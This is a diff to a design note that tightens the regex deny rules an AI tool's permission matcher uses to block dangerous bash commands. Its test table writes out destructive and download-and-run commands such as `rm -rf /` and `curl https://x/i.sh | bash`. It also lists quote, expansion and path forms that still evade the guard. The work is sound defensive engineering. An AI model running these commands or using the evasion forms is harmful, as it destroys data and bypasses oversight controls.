@@ -3,16 +3,19 @@
 ## Context
 
 Rejects are regex or literal clauses the permission matcher compiles with
-`re2js`, after rewriting `\s` into an explicit class
-(`apps/api/src/tools/permissions/matcher.ts`). B1 and B8 are data in the
-recommended table; nothing in code special-cases them.
+`re2js` (`apps/api/src/tools/permissions/matcher.ts`). Only literal clauses get
+the matcher's flexible-whitespace rewrite; a regex clause compiles unchanged,
+so its `\s` is RE2's ASCII class `[\t\n\f\r ]`, which covers Bash's blanks and
+newline. B1, B2, and B8 are data in the recommended table; nothing in code
+special-cases them.
 
 ## Goals / Non-Goals
 
 **Goals:**
 
-- B1 and B8 reject a dangerous command name however a shell separator ends it.
-- No new false positive on a name that continues into a longer word.
+- B1, B2, and B8 reject a dangerous command however a shell separator ends it.
+- No new false positive on a name that continues into a longer word or that is
+  followed by `(`.
 
 **Non-Goals:**
 
@@ -20,53 +23,62 @@ recommended table; nothing in code special-cases them.
 
 ## Decisions
 
-### D1. One terminator class shared by B1 and B8
+### D1. One terminator shared by B1, B2, and B8
 
-`($|[\s;&|()<>\x60])`: end of input, whitespace, the control operators `;`,
-`&`, `|`, the subshell parentheses, the redirections `<` and `>`, and a
-backtick. This is B2's existing `($|[\s;&|])` widened by the shapes #1169 and
-its review list.
+`($|[\s;&|)<>\x60])`. Bash's metacharacters are blank, newline, `|`, `&`, `;`,
+`(`, `)`, `<`, and `>`; a backtick ends a command substitution.
 
-- Alternative: a word boundary `\b`. Rejected: `\b` also ends a word at `.`
-  and `-`, so `reboot.sh` and `sudo-wrapper` would match, a new false
-  positive.
-- Alternative: list only `;`, `&`, `|` as the issue suggests minimally.
-  Rejected: `(halt)`, `$(reboot)`, and a backticked `` `reboot` `` are ordinary
-  shell spellings with the same effect.
+- `(` is excluded. A command word followed directly by `(` never runs that
+  command (`name()` defines a function, `name(x)` is a syntax error), while
+  including it rejects code searches and snippets such as
+  `grep -rn "shutdown(" src` or `node -e 'server.shutdown()'`. A subshell
+  `(halt)` is still rejected by its closing `)`.
+- Alternative: a word boundary `\b`. Rejected: it also ends at `.` and `-`, so
+  `reboot.sh` and `sudo-wrapper` would match.
+- Alternative: #1169's `(\s|$|[;&|()<>])`. Adopted except for `(`, as above,
+  plus the backtick.
 
 ### D2. Spell the backtick as `\x60`
 
 A literal backtick inside the table's code span would need doubled
-delimiters and invites copy errors; B8 already spells `|` as `\x7c` for the
-same reason. `re2js` accepts `\x60` in a class.
+delimiters; B8 already spells `|` as `\x7c`. `re2js` reads `\x60` inside a
+class, and the JSONC example writes it `\\x60`.
 
-### D3. Prove with the production compiler
+### D3. B8's pipe accepts `|&`, and B2 takes the shipped form
 
-A throwaway test compiled both patterns with `compileToolPermissionMap` and
+`\x7c&?` admits Bash's `|&` pipe. B2's row adopts the long B2 the example and
+mirror already ship (split flags, `--recursive`/`--force`,
+`--no-preserve-root`), with the D1 terminator in place of `($|[\s;&|])`.
+
+### D4. Proof through the production compiler
+
+A throwaway test compiled the three patterns with `compileToolPermissionMap`
+(B2 read from `portable-tool-policy.ts` with its terminator replaced) and
 evaluated `bash` calls through `evaluatePermission`, as the portable policy
-does:
+does. All 29 cases decided as expected:
 
-| Command                          | Decision |
-| -------------------------------- | -------- |
-| `reboot`, `reboot;`              | reject   |
-| `reboot&&true`, `sudo\|x`        | reject   |
-| `(halt)`, `` echo `reboot` ``    | reject   |
-| `reboot>log`, `sudo<TAB>rm file` | reject   |
-| `mkfs.ext4 /dev/sdb`             | reject   |
-| `curl x\|sh;`                    | reject   |
-| `curl https://x/i.sh \| bash`    | reject   |
-| `wget -qO- x \| zsh&&echo`       | reject   |
-| `reboot.sh`, `sudoers`           | allow    |
-| `shutdownhook`, `sudo-wrapper x` | allow    |
-| `curl x \| shellcheck -`         | allow    |
-| `curl https://x`                 | allow    |
+| Command                                                                        | Decision |
+| ------------------------------------------------------------------------------ | -------- |
+| `reboot;`, `true && reboot; echo done`, `sudo\|tee x`, `(halt)`                | reject   |
+| `` echo `reboot` ``, `reboot>log`, `$(reboot)`, `{ reboot; }`                  | reject   |
+| `reboot&>f`, `reboot` followed by a newline                                    | reject   |
+| `(rm -rf ~)`, `$(rm -rf ~)`, `` echo `rm -rf /` ``, `rm -rf ~>/dev/null`       | reject   |
+| `rm -rf /*>log`, `rm -rf /;`, `rm -rf --no-preserve-root /`                    | reject   |
+| `curl x\|sh;`, `curl x \|& sh`, `curl x\|&bash`, `curl https://x/i.sh \| bash` | reject   |
+| `./reboot.sh`, `cat /etc/sudoers`, `grep -rn "shutdown(" src`                  | allow    |
+| `node -e 'server.shutdown()'`, `curl x \| shellcheck -`                        | allow    |
+| `rm -rf /tmp/build-output`, `rm -rf ./dist`, `curl https://x`                  | allow    |
 
 ## Risks / Trade-offs
 
 - [Operators who copied the old example keep the old patterns] → An explicit
   map is the complete policy by design, so llame cannot patch it; the
-  changelog entry names B1 and B8 and tells operators to re-copy them.
-- [A textual guard still misses obfuscation such as `r''eboot` or `$CMD`] →
-  Already true of every recommended reject; the requirement frames them as
-  textual, and a sandbox or approval policy is the stronger control
-  (ROADMAP local Sandbox execution).
+  changelog entry names B1, B2, and B8 and tells operators to re-copy them.
+- [Textual residuals remain] → Suffix quote, expansion, and escape forms still
+  pass: `reboot''`, `reboot""`, `reboot$()`, `reboot${IFS}`, a
+  backslash-newline continuation, and for B8 a path- or wrapper-prefixed shell
+  such as `| /bin/sh` or `| env bash`. Their prefix mirrors (`''reboot`,
+  `\reboot`) are caught, because the leading boundary accepts any non-word
+  character. Every recommended reject is textual and the requirement frames
+  them so; a sandbox or approval policy is the stronger control (ROADMAP local
+  Sandbox execution).
